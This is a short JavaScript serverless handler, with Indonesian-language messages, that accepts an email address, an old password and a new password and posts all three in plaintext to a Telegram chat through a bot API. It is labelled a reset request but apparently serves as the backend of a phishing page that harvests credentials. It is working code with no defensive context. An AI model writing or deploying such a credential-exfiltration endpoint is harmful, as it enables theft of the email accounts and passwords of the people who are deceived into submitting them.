export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  try {
    const body = await req.json?.(); // untuk edge function
    const { email, oldPass, newPass } = body || req.body || {};

    if (!email || !oldPass || !newPass) {
      return res.status(400).json({ message: '❌ Data tidak lengkap' });
    }

    const token = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    const telegramRes = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: `🔐 Reset Request:\nEmail: ${email}\nOld: ${oldPass}\nNew: ${newPass}`
      })
    });

    const result = await telegramRes.json();

    if (!telegramRes.ok || !result.ok) {
      console.error('Telegram error:', result);
      return res.status(500).json({ message: '❌ Telegram gagal' });
    }

    return res.status(200).json({ message: '✅ Sukses kirim ke Telegram' });
  } catch (err) {
    console.error('Error umum:', err);
    return res.status(500).json({ message: '❌ Server error' });
  }
}
